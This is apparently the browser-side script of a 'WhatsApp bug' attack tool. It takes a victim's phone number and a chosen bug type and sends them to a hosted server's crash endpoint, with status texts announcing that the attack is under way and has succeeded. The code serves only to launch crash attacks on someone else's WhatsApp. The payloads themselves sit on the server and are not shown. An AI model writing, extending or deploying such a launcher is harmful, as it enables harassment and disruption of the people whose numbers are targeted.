// ✅ URL de ton serveur hébergé (Render / Railway / VPS)
// ⚠️ Remplace par ta vraie URL Render après déploiement
const SERVER_URL = "https://wa-bug-server.onrender.com";

const sendBtn = document.getElementById("sendBtn");
const targetInput = document.getElementById("target");
const bugTypeInput = document.getElementById("bug-type");
const overlay = document.getElementById("loading-overlay");
const loadingText = document.getElementById("loading-text");

sendBtn.addEventListener("click", async () => {
  const target = targetInput.value.trim();
  const bug = bugTypeInput.value;

  // ✅ Vérification côté client
  if (!target) {
    alert("⚠️ Weka namba ya target kwanza.");
    targetInput.focus();
    return;
  }

  // Nettoyage rapide du numéro
  const cleanTarget = target.replace(/[^0-9]/g, "");
  if (cleanTarget.length < 9) {
    alert("⚠️ Namba haionekani sahihi.");
    return;
  }

  // UI loading
  overlay.classList.add("active");
  loadingText.textContent = "INATUMA SHAMBULIO...";
  sendBtn.disabled = true;

  try {
    const res = await fetch(`${SERVER_URL}/api/crash`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ target: cleanTarget, bug })
    });

    const data = await res.json();

    if (data.success) {
      loadingText.textContent = "✅ SHAMBULIO LIMEFANIKIWA";
    } else {
      loadingText.textContent = "❌ " + (data.message || "Imeshindikana");
    }
  } catch (err) {
    console.error(err);
    loadingText.textContent = "❌ SERVER HAIPATIKANI";
  } finally {
    setTimeout(() => {
      overlay.classList.remove("active");
      sendBtn.disabled = false;
    }, 2500);
  }
});

// ✅ Vérification au chargement : le serveur répond-il ?
window.addEventListener("load", async () => {
  try {
    const res = await fetch(`${SERVER_URL}/api/health`);
    const data = await res.json();
    console.log("🟢 Serveur joignable :", data);
    if (!data.whatsapp) {
      console.warn("⚠️ WhatsApp bot pas encore connecté sur le serveur.");
    }
  } catch (err) {
    console.error("🔴 Serveur injoignable :", err);
    alert("⚠️ Le serveur backend est injoignable. Vérifie qu'il est bien déployé et démarré.");
  }
});
